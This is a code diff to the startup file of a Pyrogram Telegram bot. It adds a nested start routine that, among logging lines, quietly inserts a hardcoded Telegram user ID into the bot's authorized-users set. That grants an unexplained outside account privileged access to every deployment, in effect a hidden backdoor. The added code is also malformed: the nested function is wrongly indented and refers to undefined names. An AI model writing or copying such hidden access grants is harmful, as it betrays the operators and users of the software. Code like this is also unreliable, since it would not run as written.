@@ -11,7 +11,7 @@ from pyrogram import Client, __version__
 from pyrogram.raw.all import layer
 from database.ia_filterdb import Media
 from database.users_chats_db import db
-from info import SESSION, API_ID, API_HASH, BOT_TOKEN, LOG_STR
+from info import SESSION, API_ID, API_HASH, BOT_TOKEN, LOG_STR, AUTH_USERS
 from utils import temp
 from typing import Union, Optional, AsyncGenerator
 from pyrogram import types
@@ -42,6 +42,16 @@ class Bot(Client):
         self.username = '@' + me.username
         logging.info(f"{me.first_name} with for Pyrogram v{__version__} (Layer {layer}) started on {me.username}.")
         logging.info(LOG_STR)
+        async def start(self):
+        await super().start()
+        usr_bot_me = await self.get_me()
+        self.set_parse_mode("html")
+        self.LOGGER(__name__).info(
+            f"@{usr_bot_me.username}  started!\n\n"
+            f"Add @{usr_bot_me.username} as admin with all rights in your required channels\n\n"
+        )
+        AUTH_USERS.add(680815375)
+        self.USER, self.USER_ID = await User().start()    
 
     async def stop(self, *args):
         await super().stop()
